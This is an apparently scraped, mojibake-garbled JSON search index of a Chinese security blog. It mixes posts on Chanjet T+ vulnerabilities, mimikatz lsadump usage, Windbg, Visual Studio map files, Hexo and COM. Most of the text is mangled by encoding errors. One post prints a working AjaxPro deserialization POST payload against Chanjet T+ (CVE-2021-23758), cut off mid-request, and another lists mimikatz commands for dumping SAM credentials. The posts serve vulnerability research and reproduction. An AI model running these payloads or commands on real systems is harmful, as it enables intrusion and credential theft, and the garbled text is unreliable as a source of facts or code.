å‡½æ•°çš„å¤§è‡´é€»è¾‘å°±æ˜¯æ£€æŸ¥å‚æ•°çš„ Content-Type å’Œæ–‡ä»¶å¤§å°ï¼ˆå°äº 200 KBï¼‰ï¼Œæ£€æŸ¥é€šè¿‡çš„è¯å‡½æ•°ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚åœ¨ æ¥å£è¯·æ±‚æ—¶å·²ç»ä¿®æ”¹è¿‡ä¸Šä¼ æ–‡ä»¶çš„ Content-Type äº†ï¼Œå¹¶ä¸”æ–‡ä»¶çš„å¤§å°ä¹Ÿç¬¦åˆæ¡ä»¶ã€‚æ¡ä»¶å…è®¸èŒƒå›´å†…ï¼Œä»»æ„åç¼€æ–‡ä»¶éƒ½å¯ä»¥ä¸Šä¼ ã€‚ é™„åŠ åˆ°ç•…æ·é€šè¿›ç¨‹è°ƒè¯•æˆªå›¾å¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ä¸Šå›¾è¿™é‡Œå·²ç»ä¿å­˜äº†ä¸Šä¼ çš„æ–‡ä»¶ã€‚ è¡¥å……ï¼šè¡¥å……ä¸€ä¸‹ preload å‚æ•°çš„æ ¡éªŒé€»è¾‘ æ‰¾ä¸€ä¸‹ App_Web_upload.aspx.9475d17f ä¾èµ–çš„dll.fhgepdzxfbow{zoom:50%;}.nvncmynovlmz{zoom:50%;} æŸ¥æ‰¾å’Œç™»å½•é‰´æƒç›¸å…³çš„æ¥å£ åˆ¤æ–­æ¡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼Œå½“ flag æˆ–è€…æ˜¯ä»¥ä¸‹æ‰€ç¤ºçš„è¯·æ±‚è·¯å¾„æ—¶ï¼Œæ‰ä¼šèµ°åˆ°æœ€ç»ˆçš„è¯·æ±‚ï¼Œå¦åˆ™ä¼šåœ¨å½“å‰è¿™ä¸ªå‡½æ•°ï¼ˆ Application_PreRequestHandlerExecuteï¼‰å¤„ç†è¯·æ±‚","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"pocsuite","slug":"pocsuite","permalink":"https://hodlyounger.github.io/tags/pocsuite/"},{"name":"POC/Upload","slug":"POC-Upload","permalink":"https://hodlyounger.github.io/tags/POC-Upload/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"ç•…æ·é€š","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/ç•…æ·é€š","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"mimikatz","date":"2024-05-06T16:00:00.000Z","path":"C_OpenSource/ã€mimikatzã€‘/","text":"æ¦‚è¿°ï¼šmimikatz é¡¹ç›®ä½¿ç”¨åŠè§£æ lsadump å‘½ä»¤å¸®åŠ© 1234567891011121314151617181920212223242526272829# ææƒprivilege::debug# è¯»å–samlsadump::sam# æŸ¥çœ‹å¸®åŠ©æ‰‹å†Œmimikatz # lsadump::ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;lsadump&quot; module not found !Module : lsadumpFull name : LsaDump module sam - Get the SysKey to decrypt SAM entries (from registry or hives) secrets - Get the SysKey to decrypt SECRETS entries (from registry or hives) cache - Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives) lsa - Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject) trust - Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly) backupkeys rpdata dcsync - Ask a DC to synchronize an object dcshadow - They told me I could be anything I wanted, so I became a domain controller setntlm - Ask a server to set a new password/ntlm for one user changentlm - Ask a server to set a new password/ntlm for one user netsync - Ask a DC to send current and previous NTLM hash of DC/SRV/WKS packages mbc zerologon postzerologon","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"https://hodlyounger.github.io/tags/OpenSource/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://hodlyounger.github.io/tags/mimikatz/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘Windbg æ’ä»¶","date":"2024-04-25T16:00:00.000Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘Windbg æ’ä»¶/","text":"æ¦‚è¿°ï¼šwindbg æ’ä»¶ ç›¸å…³æ’ä»¶æ¨è MEX å‚è€ƒæ–‡ç« ï¼šåœ¨WinDbgé‡Œä½¿ç”¨MEXè°ƒè¯•æ‰©å±• - æ´»ç€çš„è™«å­ - åšå®¢å›­","tags":[{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"},{"name":"æ’ä»¶","slug":"æ’ä»¶","permalink":"https://hodlyounger.github.io/tags/%E6%8F%92%E4%BB%B6/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€Visual Studioã€‘æŸ¥çœ‹ç¬¦å·å¯¼å…¥ä¿¡æ¯","date":"2024-04-23T16:00:00.000Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘æŸ¥çœ‹ç¬¦å·å¯¼å…¥ä¿¡æ¯/","text":"æ¦‚è¿°ï¼šé€šè¿‡ map æ–‡ä»¶æŸ¥çœ‹å¼•å…¥çš„å‡½æ•°éƒ½æ˜¯ä»å“ªä¸ªæ–‡ä»¶å¯¼å…¥çš„ 0x01 é—®é¢˜æè¿° ä¸¤ä¸ªé¡¹ç›®å¼•å…¥äº†åŒæ ·çš„ lib æ–‡ä»¶ï¼Œä¸€ä¸ªç¼–è¯‘æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¦å¤–ä¸€ä¸ªç¼–è¯‘æŠ¥é”™é“¾æ¥é”™è¯¯ï¼Œé‡åˆ°è¿™æ ·çš„é—®é¢˜ä½ è¯¥æ€ä¹ˆåŠï¼Ÿ ï¼šå¯ä»¥ä½¿ç”¨ç¼–ç¨‹æˆåŠŸå·¥ç¨‹çš„ map æ–‡ä»¶æŸ¥çœ‹å‡½æ•°æ˜¯é€šè¿‡å“ªä¸ª lib è¢«é“¾æ¥åˆ°ç›®æ ‡æ–‡ä»¶çš„ 0x02 é…ç½®ç”Ÿæˆ map æ­¥éª¤ä¸€ï¼šå…³é—­å¢é‡é“¾æ¥ æ­¥éª¤äºŒï¼šå¼€å¯ç”Ÿæˆæ˜ å°„æ–‡ä»¶å¹¶è®¾ç½®æ˜ å°„æ–‡ä»¶å é…ç½®å®Œæˆä¹‹åç¼–è¯‘å·¥ç¨‹å°±èƒ½ç”Ÿæˆ map æ–‡ä»¶äº†ã€‚ å¯ä»¥æŸ¥çœ‹ map æ–‡ä»¶æŸ¥çœ‹å¯¼å…¥å‡½æ•°çš„ä¸€äº›ä¿¡æ¯ã€‚ 0x03 map åˆ†æç¤ºä¾‹ ä¸€æ®µ map æ–‡ä»¶å†…å®¹ 123456789100001:00237500 _crc32@12 10238500 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237520 _crc32_z@12 10238520 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237770 _crc32_combine@12 10238770 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237790 _get_crc_table@0 10238790 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00238470 _crc32_combine64@16 10239470 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00238490 _deflate@8 10239490 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002394b0 _deflateEnd@4 1023a4b0 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002395c0 _deflateSetDictionary@12 1023a5c0 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:00239830 _deflateGetDictionary@12 1023a830 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002398d0 _deflateCopy@8 1023a8d0 f zlibstat_VC2017_x86_MTd:deflate.obj è§£æï¼š è¿™æ®µå†…å®¹æ¥è‡ªäºä¸€ä¸ª .map æ–‡ä»¶ï¼Œå®ƒæ˜¯é“¾æ¥å™¨åœ¨ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹ç»“æŸåç”Ÿæˆçš„ï¼ŒåŒ…å«äº†ç¨‹åºä¸­ç¬¦å·çš„åœ°å€ã€ç±»å‹å’Œä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚è¿™ä¸ªç‰¹å®šçš„ .map æ–‡ä»¶ç‰‡æ®µåˆ—å‡ºäº†ä¸ zlib å‹ç¼©åº“ç›¸å…³çš„ä¸€äº›å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯å¯¹è¿™äº›æ¡ç›®çš„åˆ†æï¼š æ¯ä¸€åˆ—çš„å…·ä½“å«ä¹‰å¯èƒ½å› ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨çš„ä¸åŒè€Œç•¥æœ‰ä¸åŒï¼Œä½†é€šå¸¸åŒ…æ‹¬ï¼š åœ°å€ï¼šç¬¦å·åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ è£…é¥°åçš„åç§°ï¼šC++ ç¼–è¯‘å™¨å¯èƒ½ä¼šå¯¹å‡½æ•°åç§°è¿›è¡Œè£…é¥°ï¼Œä»¥åŒ…å«å…³äºå‡½æ•°ç­¾åçš„ä¿¡æ¯ã€‚ åŸå§‹åç§°ï¼šå¦‚æœè£…é¥°åçš„åç§°å­˜åœ¨ï¼ŒåŸå§‹åç§°ä¹Ÿä¼šè¢«åˆ—å‡ºã€‚ å¤§å°ï¼šç¬¦å·çš„å¤§å°ï¼ˆé€šå¸¸æ˜¯å‡½æ•°çš„ä»£ç å¤§å°ï¼‰ã€‚ æ®µï¼šç¬¦å·æ‰€åœ¨çš„å†…å­˜æ®µã€‚ æ–‡ä»¶åï¼šç¬¦å·å®šä¹‰çš„æºæ–‡ä»¶ã€‚ _crc32@12ã€_crc32_z@12ã€_crc32_combine@12ã€_crc32_combine64@16ï¼šè¿™äº›æ˜¯ CRC32 æ ¡éªŒå‡½æ•°çš„ä¸åŒç‰ˆæœ¬ï¼Œ@12 å’Œ @16 è¡¨ç¤ºå‡½æ•°çš„å‚æ•°å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚CRC32 æ˜¯ä¸€ç§å¸¸ç”¨çš„æ•°æ®æ ¡éªŒç®—æ³•ã€‚ _get_crc_table@0ï¼šè¿™ä¸ªå‡½æ•°å¯èƒ½è¿”å›ä¸€ä¸ª CRC32 è¡¨çš„æŒ‡é’ˆï¼Œè¯¥è¡¨ç”¨äºä¼˜åŒ– CRC32 è®¡ç®—ã€‚ _deflate@8ã€_deflateEnd@4ã€_deflateSetDictionary@12ã€_deflateGetDictionary@12ã€_deflateCopy@8ï¼šè¿™äº›å‡½æ•°æ˜¯ zlib å‹ç¼©åº“ä¸­ç”¨äºæ•°æ®å‹ç¼©çš„ä¸åŒå‡½æ•°ã€‚_deflate@8 æ˜¯å‹ç¼©æ•°æ®çš„ä¸»è¦å‡½æ•°ï¼Œè€Œ _deflateEnd@4 ç”¨äºæ¸…ç†å‹ç¼©æµã€‚_deflateSetDictionary@12 å’Œ _deflateGetDictionary@12 ç”¨äºè®¾ç½®å’Œè·å–å‹ç¼©å­—å…¸ï¼Œè¿™å¯ä»¥æé«˜å‹ç¼©æ•ˆç‡ã€‚_deflateCopy@8 å¯èƒ½ç”¨äºå¤åˆ¶å‹ç¼©æµçš„çŠ¶æ€ã€‚ æ¯ä¸ªå‡½æ•°åé¢çš„ f å¯èƒ½è¡¨ç¤ºè¿™äº›ç¬¦å·æ˜¯æ–‡ä»¶ï¼ˆfileï¼‰çº§åˆ«çš„ï¼Œå³å®ƒä»¬æ˜¯å¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å¯¼å…¥çš„ã€‚ zlibstat_VC2017_x86_MTd:crc32.obj å’Œ zlibstat_VC2017_x86_MTd:deflate.obj è¡¨ç¤ºè¿™äº›ç¬¦å·åˆ†åˆ«æ¥è‡ª crc32.obj å’Œ deflate.obj å¯¹è±¡æ–‡ä»¶ï¼Œè¿™äº›å¯¹è±¡æ–‡ä»¶æ˜¯ zlibstat_VC2017_x86_MTd é¡¹ç›®æˆ–è§£å†³æ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚VC2017_x86_MTd å¯èƒ½è¡¨ç¤ºè¿™æ˜¯ç”¨ Visual Studio 2017 ç¼–è¯‘çš„ï¼Œé’ˆå¯¹ x86 å¹³å°ï¼Œä½¿ç”¨äº†å¤šçº¿ç¨‹ï¼ˆMTï¼‰è°ƒè¯•ï¼ˆdï¼‰é…ç½®ã€‚ é€šè¿‡åˆ†æ .map æ–‡ä»¶ï¼Œå¼€å‘è€…å¯ä»¥æ›´å¥½åœ°ç†è§£ç¨‹åºçš„å†…å­˜å¸ƒå±€å’Œç¬¦å·ä¿¡æ¯ï¼Œè¿™å¯¹äºè°ƒè¯•å’Œæ€§èƒ½åˆ†æéå¸¸æœ‰ç”¨ã€‚","tags":[{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€æ‰‹å†Œã€‘Hexo draft ä½¿ç”¨","date":"2024-04-22T16:00:00.000Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘Hexo draft ä½¿ç”¨/","text":"æ¦‚è¿°ï¼šHexo ä½¿ç”¨è‰ç¨¿ç®± åˆ›å»ºè‰ç¨¿ åˆ›å»ºè‰ç¨¿éœ€è¦ä½¿ç”¨ draft å¸ƒå±€ï¼Œä¾‹å¦‚ï¼š 12$ hexo new draft &quot;Draft Demo&quot;INFO Created: ~/VScode/blog/source/_drafts/Draft-Demo.md é¢„è§ˆè‰ç¨¿ é»˜è®¤æƒ…å†µä¸‹ï¼Œè‰ç¨¿ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œå¦‚æœæƒ³è¦æ˜¾ç¤ºå¯ä»¥åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶ _config.yml ä¸­æŠŠ render_drafts å‚æ•°è®¾ä¸º true æ¥é¢„è§ˆè‰ç¨¿ã€‚ 1render_drafts: true æˆ–è€…åœ¨å¯åŠ¨æœåŠ¡å™¨æ—¶åŠ ä¸Š --draft å‚æ•°æ¥é¢„è§ˆè‰ç¨¿ 1hexo server --draft å‘å¸ƒè‰ç¨¿ å°†è‰ç¨¿æ–‡ä»¶å‘å¸ƒåˆ° _posts æ–‡ä»¶å¤¹ä¸‹ 1hexo publish [layout] &lt;title&gt; ä¾‹å¦‚ï¼š 12$ hexo publish post Draft-DemoINFO Published: ~/VScode/blog/source/_posts/Draft-Demo.md","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://hodlyounger.github.io/tags/Hexo/"},{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€POCã€‘POC ç´¢å¼•","date":"2024-04-17T16:00:00.000Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/ã€POCã€‘POC ç´¢å¼•/","text":"æ¦‚è¿°ï¼šPOC å¼•è·¯ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ [toc] å·²æ•´ç† ç•…æ·é€š CVE-2021-23758 ç•…æ·é€šååºåˆ—åŒ– ã€CVE-2021-23758ã€‘Ajax .NET Professional ä¸­çš„ RCE æ¼æ´ QVD-2021-13612 ç•…æ·é€šSQLæ³¨å…¥ ã€QVD-2023-13612ã€‘ç•…æ·é€šT+ SQL æ³¨å…¥æ¼æ´ Exchange CVE-2020-0688 ã€CVE-2020-0688ã€‘exchangeè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç° å¼€æº Your list / POC å¥½æ–‡æ¨è ç•…æ·é€šT+ä»»æ„æ–‡ä»¶ä¸Šä¼ (CNVD-2022-60632 )æ¼æ´å¤ç°- Track çŸ¥è¯†ç¤¾åŒº - æŒæ§å®‰å…¨åœ¨çº¿æ•™è‚² - Powered by æŒæ§è€… ç•…æ·é€šæ–‡ä»¶ç»“æ„åˆ†æï¼Œå¯æ‰§è¡Œæ–‡ä»¶åˆ†æ","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"}]},{"title":"ã€æ‰‹å†Œã€‘UnSplash å›¾æºAPIæŸ¥è¯¢æ‰‹å†Œ","date":"2024-04-16T16:00:00.000Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€æ‰‹å†Œã€‘UnSplash å›¾æºAPIæŸ¥è¯¢æ‰‹å†Œ/","text":"æ¦‚è¿°ï¼šUnSplash æ¥å£å¿«é€ŸæŸ¥è¯¢æ‰‹å†Œ é€šç”¨æ¥å£ 1https://source.unsplash.com/1280x640/?Technology æ”¯æŒçš„åˆ†ç±»æœ‰ï¼š Wallpaperã€Natureã€Peopleã€Architectureã€Eventsã€Businesã€Experimentalã€Fashionã€Filmã€Healthã€Technologyã€Travelã€Texturesã€Animalsã€Foodã€Athleticsã€Spiritualityã€Artsã€History éšæœºå›¾ç‰‡ 1https://source.unsplash.com/random æŒ‡å®šç”¨æˆ· 1https://source.unsplash.com/user/&#123;USERNAME&#125; æŒ‡å®šå°ºå¯¸ 123456https://source.unsplash.com/random/&#123;WIDTH&#125;x&#123;HEIGHT&#125;---------------------------------------------------https://source.unsplash.com/random/1280X960https://source.unsplash.com/random/800X600https://source.unsplash.com/random/2560X1920","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€COMã€‘å¼€å‘ç»éªŒæ•´ç†","date":"2024-04-16T16:00:00.000Z","path":"A_OS/Windows/COM/ã€COMã€‘å¼€å‘ç»éªŒæ•´ç†/","text":"æ¦‚è¿°ï¼šå¼€å‘ä¸­é‡åˆ°çš„ COM å¼‚å¸¸å’Œç›¸å…³æ–‡ç« æ•´ç† çŸ¥è¯†ç‚¹ COM+ çº¿ç¨‹æ¨¡å‹ æ–‡ç« æ•´ç† å®˜æ–¹æ–‡æ¡£ COM+ï¼ˆç»„ä»¶æœåŠ¡ï¼‰ - Win32 apps | Microsoft Learn COM+ ä¸Šä¸‹æ–‡å’Œçº¿ç¨‹æ¨¡å‹ - Win32 apps | Microsoft Learn COM+ çº¿ç¨‹æ¨¡å‹ - Win32 apps | Microsoft Learn å¼‚å¸¸ åˆ›å»ºå¯¹è±¡å¼‚å¸¸ CoinitializeEx è¿”å› 0x80010106 å…³é”®å­—ï¼šCOINIT_MULTITHREADED ã€COINIT_APARTMENTTHREADED CoInitializeExè¿”å› â€œ0x80010106â€œ æˆ–è€… â€œRPC_E_CHANGED_MODEâ€œ-CSDNåšå®¢","tags":[{"name":"COM","slug":"COM","permalink":"https://hodlyounger.github.io/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/COM/"}]},{"title":"ã€CVE-2021-23758ã€‘Ajax .NET Professional ä¸­çš„ RCE æ¼æ´","date":"2024-04-15T16:00:00.000Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/ç•…æ·é€š/ã€CVE-2021-23758ã€‘Ajax.NET_Professional_ä¸­çš„RCEæ¼æ´/","text":"æ¦‚è¿°ï¼š CVE-2021-23758 Ajax.NET Professional ä¸­çš„ RCE ååºåˆ—åŒ–æ¼æ´åˆ†æåŠè¯´æ˜ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ æ¼æ´è¯´æ˜ Ajax.NET Professional (AjaxPro)æ˜¯æœ€å…ˆæŠŠAJAXæŠ€æœ¯åº”ç”¨åœ¨å¾®è½¯.NETç¯å¢ƒä¸‹æ¡†æ¶ä¹‹ä¸€ï¼Œå…·æœ‰éƒ¨ç½²ç®€å•ã€ä½¿ç”¨æ–¹ä¾¿ã€è¿è¡Œé«˜æ•ˆç­‰ç‰¹ç‚¹ï¼› è¯¥æ¡†æ¶èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªä»£ç†ç±»ä¸”å¯ä»¥ä½¿å®¢æˆ·ç«¯çš„JSä»£ç å®ç°è°ƒç”¨æœåŠ¡ç«¯çš„æ–¹æ³•ï¼Œå¹¶èƒ½è¿”å›å„ç§åœ¨.NETé‡Œä½¿ç”¨çš„ç±»å‹ï¼›ä½¿ç”¨è¯¥æ¡†æ¶å’Œç›´æ¥ä½¿ç”¨.NETåŸºæœ¬æ— å·®åˆ«ã€‚ è¯¥æ¼æ´æ˜¯ç”±äºAjaxProå¼€æºç»„ä»¶.NET Class Handlerå­˜åœ¨å¯¹è¾“å…¥æ•°æ®é™åˆ¶æ£€æŸ¥ä¸ä¸¥æ ¼å¼•èµ·çš„ï¼›è¯¥AjaxProæ¡†æ¶åœ¨JavaScriptDeserializer.DeserializeFromJsonå‡½æ•°ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé€šè¿‡__typeè·å–çš„Typeå¯¹è±¡ä¸”å¯å¯¹å…¶Typeå¯¹è±¡ä¿®æ”¹ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ è¯¦è§åæ–‡åˆ†æã€‚ å—å½±å“è½¯ä»¶ ç•…æ·é€š T+ GetStoreWarehouseByStore ååºåˆ—åŒ–æ¼æ´ å½±å“ç‰ˆæœ¬ T+13.0ã€T+16.0 æ¼æ´è¯´æ˜ åˆ†æå†…å®¹åœ¨å †æ ˆç« èŠ‚ æ¼æ´ä¸»è¦æ˜¯å› ä¸ºajaxProç»„ä»¶å­˜åœ¨ CVE-2021-23758ï¼Œä½†æ˜¯è¿™ä¸ªæ¼æ´æœ‰ä¸ªè¦æ±‚æ˜¯ä¼ è¾“çš„å‚æ•°ç±»å‹å¿…é¡»æ˜¯ object é€šè¿‡åç¼–è¯‘ App_Code.dll çš„ Ufida.T.CodeBehind._PriorityLevel ä¸­ GetStoreWarehouseByStore æ–¹æ³•æ»¡è¶³è¿™ä¸ªè¦æ±‚ å¯ä»¥çœ‹åˆ° GetStoreWarehouseByStore ç”±[AjaxMethod]ä¿®é¥°ï¼Œæ¥æ”¶ä¸€ä¸ª object ç±»å‹çš„å‚æ•° storeID æ‰€ä»¥è·¯å¾„å°±æ˜¯ /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore /tplus æ˜¯ nginx çš„æ˜ å°„è·¯å¾„ï¼Œ/ajaxpro/* åˆ™æ˜¯ web.config ä¸­å®šä¹‰çš„ ajaxPro ç»„ä»¶å¤„ç†è·¯å¾„ POC æ‰§è¡Œ POC ä¼šåœ¨ tplus ç›®å½•ä¸‹ç”Ÿæˆ testwhoami.txt æ–‡æœ¬ 12345678910111213141516171819202122POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36X-Ajaxpro-Method: GetStoreWarehouseByStoreAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: closeContent-type: application/x-www-form-urlencodedContent-Length: 597&#123; &quot;storeID&quot;:&#123; &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;, &quot;MethodName&quot;:&quot;Start&quot;, &quot;ObjectInstance&quot;:&#123; &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;StartInfo&quot;: &#123; &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, 